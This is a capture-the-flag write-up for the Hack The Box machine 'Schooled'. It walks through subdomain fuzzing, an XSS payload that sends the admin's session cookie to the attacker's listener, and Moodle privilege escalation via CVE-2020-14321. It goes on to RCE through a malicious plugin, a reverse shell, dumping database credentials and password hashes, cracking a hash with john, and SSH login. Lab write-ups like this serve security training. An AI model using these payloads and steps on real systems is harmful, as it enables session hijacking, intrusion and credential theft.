# Enumeration-

![[Pasted image 20210706042957.png]]

![[Pasted image 20210706044834.png]]

Added schooled.htb to our host file.

### Wfuzz-

```bash
root@napster:~/Documents/HTB/Schooled# wfuzz -u http://10.10.10.234/ -H "Host: FUZZ.schooled.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -f subdomain.txt --hw 1555
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.234/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                      
=====================================================================

000000131:   200        1 L      5 W        84 Ch       "moodle"
```

Found new subdomain moodle

Added that to our host file-

```bash
10.10.10.234    schooled.htb moodle.schooled.htb
```


# moodle.schooled.htb-

![[Pasted image 20210706045139.png]]

We clicked on login and registered ourself as a new user-

![[Pasted image 20210706050016.png]]


User- napster
Pass-Napster2019!

And we were greeted with our account-

![[Pasted image 20210706050247.png]]


On further exploration we found that we can enroll ourself in Mathematics course-


![[Pasted image 20210706050842.png]]


![[Pasted image 20210706051019.png]]


After enrolling we were able to see an announcement by Manuel Philips-

![[Pasted image 20210706051238.png]]


Looking at the announcement we get a very strong inclination or hint  towards  XSS attack.



# XSS -

Following up with the announcement-

![[Pasted image 20210706052832.png]]


### Payload -

```bash
<img src=x onerror=this.src='http://10.10.14.35:9001/?'+document.cookie;>
```

![[Pasted image 20210706053630.png]]


Starting our netcat listener before saving the above and we got the cookie of admin-

```bash
root@napster:~/Documents/HTB/Schooled# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.14.35] 58942
GET /?MoodleSession=cguu48277b9lvk86370vimr571 HTTP/1.1
Host: 10.10.14.35:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://moodle.schooled.htb/moodle/user/profile.php?id=29
Connection: keep-alive
```

### Cookie-cguu48277b9lvk86370vimr571

Insert the cookie [F12-->Storage-->Cookies]


![[Pasted image 20210706055639.png]]


Just save and refresh the page and BOOM!!! -

![[Pasted image 20210706060032.png]]


We became Manuel Philips.

Searching for exploit for moodle we found a RCE -

[Github Link](https://github.com/HoangKien1020/CVE-2020-14321)

[POC Video](https://vimeo.com/441698193)


### Background-

This vulnerability allows Course enrolments to allow privilege escalation from teacher role into manager role.

So, adding a manager as a new student to the course, we can intercept the request and give ourselves, the teacher role_id=1 which is the manager role. Then as a manager, we can login as other managers, the main manager, who has capability to edit the moodle.


### Exploitation-

So our target will be  Manager-

![[Pasted image 20210706122144.png]]

Reproducing above PoC-

Adding Lianne Carter as student -

![[Pasted image 20210706123540.png]]


![[Pasted image 20210706124307.png]]


Capturing the request using and Burp & modifying it-

![[Pasted image 20210706132253.png]]

Changing userlist to 24 and roletoassign to 1(admin)

And Forwarded the request and we were able to switch to Lianna as administrator-

![[Pasted image 20210706132548.png]]

### Payload to full permissions-

Referring the github post we will try to get all the permissions:


![[Pasted image 20210706133047.png]]



![[Pasted image 20210706134717.png]]

Uploading zip file through add plugins for RCE-

![[Pasted image 20210706134946.png]]


![[Pasted image 20210706135636.png]]

Triggering the payload-

```bash
moodle.schooled.htb/moodle/blocks/nap/lang/en/block_rce.php
```

### Shell -

```bash
root@napster:~/Documents/HTB/Schooled# nc -nvlp 9002
listening on [any] 9002 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.234] 29856
FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64
 7:07PM  up  2:41, 0 users, load averages: 2.13, 1.16, 0.93
USER       TTY      FROM    LOGIN@  IDLE WHAT
uid=80(www) gid=80(www) groups=80(www)
sh: can't access tty; job control turned off
$ whoami
www
$ id
uid=80(www) gid=80(www) groups=80(www)
```

### Enumeration -

```bash
$ pwd
/usr/local/www/apache24/data/moodle
$ cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
```


dbname = moodle
dbuser = moodle
dbpass = PlaybookMaster2020

```bash
$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show databases;'
mysql: [Warning] Using a password on the command line interface can be insecure.           
Database 
information_schema             
moodle
$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'show tables from moodle;' 
mysql: [Warning] Using a password on the command line interface can be insecure.   
Tables_in_moodle 
mdl_analytics_indicator_calc 
mdl_analytics_models
mdl_analytics_models_log         
mdl_analytics_predict_samples
<SNIP>
mdl_tool_usertours_steps
mdl_tool_usertours_tours
mdl_upgrade_log
mdl_url
mdl_user								<-->
mdl_user_devices
mdl_user_enrolments
```

mdl_user

```bash
$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e 'use moodle;select * from mdl_user;'
2       manual  1       0       0       0       1       admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW   Jamie Borham  jamie@
staff.schooled.htb      0
```

Got Admin hash for Jamie-

Admin-->Jamie-->$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW

```bash
root@napster:~/Documents/HTB/Schooled# john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (?)
1g 0:00:04:32 DONE (2021-07-06 14:51) 0.003672g/s 51.03p/s 51.03c/s 51.03C/s aldrich..superpet
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

|Name|Password|
|--|--|
|Jamie|!QAZ2wsx|

# SSH -

```bash
root@napster:~/Documents/HTB/Schooled# ssh jamie@10.10.10.234
jamie@Schooled:~ $ id
uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)
jamie@Schooled:~ $ cat user.txt 
403539f4876b77f4f648967f2f200a7f
``